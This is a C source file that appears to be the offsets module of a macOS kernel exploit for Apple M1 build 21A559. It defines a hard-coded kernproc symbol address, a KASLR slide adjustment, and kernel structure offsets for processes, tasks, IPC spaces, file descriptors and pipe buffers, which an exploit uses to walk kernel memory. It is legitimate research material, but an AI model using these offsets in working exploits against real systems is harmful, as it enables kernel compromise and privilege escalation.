#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <sys/sysctl.h>

#include "offsets.h"

extern uint64_t gKernelBase, gKernelSlide;

uint64_t *gadgets = NULL;
uint64_t *symbols = NULL;
uint64_t kaslr_slide = 0;
uint64_t kversion_major = 0;

uint64_t ksymbols_avm1_21a559[] = {
    (0xFFFFFE0009546348),   // KSYMBOL_KERNPROC
};

uint64_t ksym(enum ksymbol sym)
{
    if(kversion_major == KVERSION_21)
        kaslr_slide = (gKernelSlide - 0x4b4000);

    return symbols[sym] + kaslr_slide;
}

uint32_t off_p_pid = 0;
uint32_t off_p_pfd = 0;
uint32_t off_p_list_le_prev = 0;
uint32_t off_p_task = 0;
uint32_t off_task_itk_space = 0;
uint32_t off_ipc_space_is_table = 0;
uint32_t off_fd_ofiles = 0;
uint32_t off_fp_fglob = 0;
uint32_t off_fg_data = 0;
uint32_t off_pb_buffer = 0;

void offsets_init(void) {
    char kern_version[512] = {};
    size_t size = sizeof(kern_version);
    sysctlbyname("kern.version", &kern_version, &size, NULL, 0);

    if (strcmp(kern_version, AVM1_21A559_KVERSION) != 0) {
        printf("[-] Your Kernel is NOT supported.\n");
        exit(EXIT_FAILURE);
    }

    if (strcmp(kern_version, AVM1_21A559_KVERSION) == 0) {
        off_p_pid = 0x68;   //p/x offsetof(proc, p_pid)
        off_p_pfd = 0xe0;    //p/x offsetof(proc, p_fd)
        off_p_list_le_prev = 0x8;   //p/x offsetof(proc, p_list.le_prev)

        off_p_task = 0x10;  //p/x offsetof(proc, task)

        off_task_itk_space = 0x330; //p/x offsetof(task, itk_space)
        off_ipc_space_is_table = 0x20;  //p/x offsetof(ipc_space, is_table)

        off_fd_ofiles = 0x20;   //p/x offsetof(filedesc, fd_ofiles)

        off_fp_fglob = 0x10;    //p/x offsetof(fileproc, fp_glob)

        off_fg_data = 0x38;     //p/x offsetof(fileglob, fg_data)

        off_pb_buffer = 0x10;   //p/x offsetof(struct pipe, pipe_buffer.buffer)


        symbols = ksymbols_avm1_21a559;
        kversion_major = KVERSION_21;
    }
}
